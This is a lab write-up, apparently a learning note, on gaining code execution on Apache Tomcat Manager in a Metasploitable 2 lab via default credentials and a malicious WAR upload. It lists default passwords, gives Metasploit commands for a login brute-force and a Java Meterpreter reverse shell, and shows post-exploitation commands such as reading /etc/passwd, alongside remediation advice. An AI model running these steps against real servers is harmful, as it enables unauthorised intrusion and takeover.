# Apache Tomcat — Default Credentials & Malicious WAR File Upload (RCE)

## Vulnerability Overview

| Field              | Details                                          |
|-------------------|--------------------------------------------------|
| **CVE**           | CVE-2009-3843 / CVE-2009-4189                    |
| **Service**       | Apache Tomcat Manager App                        |
| **Port**          | 8180/tcp                                         |
| **Severity**      | 🔴 Critical                                      |
| **Vulnerability** | Default Credentials + Malicious WAR Upload       |
| **MSF Module**    | `exploit/multi/http/tomcat_mgr_deploy`           |
| **Auth Required** | ✅ Yes (but default credentials trivially bypass this) |

---

## Environment

| Role     | OS               | IP Address      |
|----------|------------------|-----------------|
| Attacker | Kali Linux       | 192.168.133.129 |
| Target   | Metasploitable 2 | 192.168.133.128 |

---

## Background

### What is Apache Tomcat?

Apache Tomcat is an open-source **web server and servlet container** designed to execute **Java Servlets** and **JavaServer Pages (JSPs)**. Organizations use it to deploy dynamic Java-based web applications.

It includes a built-in web-based administration interface called the **Tomcat Manager App**, accessible at:

```
http://<target>:<port>/manager/html
```

The Manager App allows administrators to:
- Deploy and undeploy web applications remotely
- Upload `.war` (Web Application Archive) files
- Start, stop, and reload applications
- Monitor server status

### What is a WAR File?

A `.war` (Web Application Archive) file is a packaged Java web application — essentially a ZIP file containing servlets, JSPs, HTML, and configuration files that Tomcat can deploy and execute directly. This is a **legitimate feature** that attackers abuse to gain code execution.

### Ports

| Port | Service                          |
|------|----------------------------------|
| 8080 | Default Tomcat HTTP port         |
| 8180 | Alternate Tomcat HTTP port (Metasploitable 2) |
| 8443 | Default Tomcat HTTPS port        |
| 8009 | AJP connector (Tomcat ↔ Apache)  |

---

## Vulnerability Explanation

This is **not a software bug or code flaw** — it is a severe **configuration weakness**.

The Tomcat Manager App was left deployed with **default credentials** that were never changed. Common default pairs include:

| Username | Password |
|----------|----------|
| `tomcat`  | `tomcat`  |
| `admin`   | `admin`   |
| `admin`   | `password`|
| `manager` | `manager` |
| `root`    | `root`    |

Once an attacker gains access to the Manager dashboard using these credentials, they can **abuse the legitimate WAR deployment feature** to upload a malicious `.war` file containing a Java-based web shell — granting full **Remote Code Execution (RCE)** on the server.

### Why Java Payloads?

Apache Tomcat runs inside a **Java Virtual Machine (JVM)**. This means any payload must be **Java-compatible** to execute within that environment. Standard native payloads (x86/x64 ELF or PE) will not work here.

---

## Phase 1 — Verification & Credential Discovery

### Manual Check

Navigate to the Manager App in a browser:

```
http://192.168.133.128:8180/manager/html
```

Try common default credential pairs. A successful login reveals the full Manager dashboard.

### Automated Credential Brute-Force (Metasploit)

Metasploit provides a dedicated auxiliary scanner to automate credential testing:

```bash
msfconsole
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.133.128
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
msf auxiliary(tomcat_mgr_login) > run
```

**Expected output on success:**

```
[+] 192.168.133.128:8180 - Login Successful: <username>:<password>
```

Note the discovered credentials for use in Phase 2.

---

## Phase 2 — Exploitation (Malicious WAR Upload)

### How the Exploit Works

The `tomcat_mgr_deploy` module performs the following steps automatically:

1. Authenticates to the Manager App using the discovered credentials
2. Generates a malicious `.war` file containing the selected payload
3. Uploads the `.war` file via the Manager's deploy endpoint
4. Triggers execution of the payload
5. Establishes a reverse session back to the attacker
6. Cleans up by undeploying and deleting the `.war` file

### Recommended Payloads

Since Tomcat runs within a JVM, only **Java-compatible payloads** work:

| Payload | Type | Best For |
|---------|------|----------|
| `java/meterpreter/reverse_tcp` | Java Meterpreter | Full post-exploitation (recommended) |
| `java/shell/reverse_tcp` | Java Command Shell | Lightweight basic shell |

**Java Meterpreter** is recommended — it runs entirely in JVM memory space and provides advanced capabilities like filesystem navigation, process listing, privilege escalation modules, and pivoting — without dropping any additional files to disk.

### Exploitation Commands

```bash
msf > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > set RHOSTS 192.168.133.128
msf exploit(tomcat_mgr_deploy) > set RPORT 8180
msf exploit(tomcat_mgr_deploy) > set HttpUser <found_username>
msf exploit(tomcat_mgr_deploy) > set HttpPassword <found_password>
msf exploit(tomcat_mgr_deploy) > set LHOST 192.168.133.129
msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
msf exploit(tomcat_mgr_deploy) > exploit
```

**Expected output:**

```
[*] Started reverse TCP handler on 192.168.133.129:4444
[*] Uploading 6536 bytes as <random>.war...
[*] Executing /manager/html/upload...
[*] Undeploying <random>.war...
[*] Meterpreter session 1 opened (192.168.133.129:4444 → 192.168.133.128:...)
```

✅ **Meterpreter session established under the privileges of the Tomcat process.**

---

## Post-Exploitation

Once inside the Meterpreter session, basic enumeration can be performed:

```bash
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user context
meterpreter > shell            # Drop into native OS shell
```

Inside the shell:

```bash
whoami                         # Confirm running user
cat /etc/passwd                # User enumeration
cat /etc/issue                 # OS info
ps aux                         # Running processes
find / -perm -4000 2>/dev/null # SUID binaries (privesc check)
```

---

## Attack Flow Summary

```
Nmap scan            →  Port 8180 open, Apache Tomcat detected
        ↓
Browser check        →  /manager/html accessible
        ↓
MSF auxiliary scan   →  Default credentials discovered
        ↓
Load deploy module   →  exploit/multi/http/tomcat_mgr_deploy
        ↓
Set Java payload     →  java/meterpreter/reverse_tcp
        ↓
Run exploit          →  Malicious WAR uploaded & executed
        ↓
WAR cleaned up       →  File removed from server automatically
        ↓
Meterpreter session  →  RCE under Tomcat process ✅
```

---

## Impact

- **Remote Code Execution** via malicious WAR file upload
- Access to all files readable by the Tomcat process
- Potential privilege escalation depending on Tomcat's OS user context
- Ability to deploy persistent backdoors as additional WAR applications
- Lateral movement within the internal network
- Credential harvesting from application config files (`context.xml`, `web.xml`)

---

## Remediation

| Action | Details |
|--------|---------|
| **Change default credentials** | Immediately replace all default Tomcat credentials with strong, unique passwords |
| **Remove Manager App** | Delete or disable the Manager App in production — it should never be internet-facing |
| **Restrict Manager access** | Limit `/manager/*` access to trusted IPs only via `context.xml` |
| **Run Tomcat as low-privilege user** | Never run Tomcat as root; create a dedicated service account |
| **Firewall port 8180/8080** | Block Tomcat ports from external networks |
| **Keep Tomcat updated** | Run the latest stable Tomcat version to patch known CVEs |
| **WAR deployment controls** | Disable remote WAR deployment if not actively required |

---

## What I Learned

- What Apache Tomcat is and why the Manager App is a high-value target
- How default credentials turn a legitimate admin feature into a critical vulnerability
- Why Java-specific payloads are required when targeting JVM-based services
- Difference between `java/meterpreter/reverse_tcp` and `java/shell/reverse_tcp`
- How Metasploit's `tomcat_mgr_deploy` automates the full WAR upload and cleanup cycle
- Importance of checking for accessible admin panels during web reconnaissance
- Why running services with default configurations in production is critically dangerous

---

## References

- [CVE-2009-3843 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2009-3843)
- [Rapid7 — Tomcat Manager Deploy](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy/)
- [Apache Tomcat Official Documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
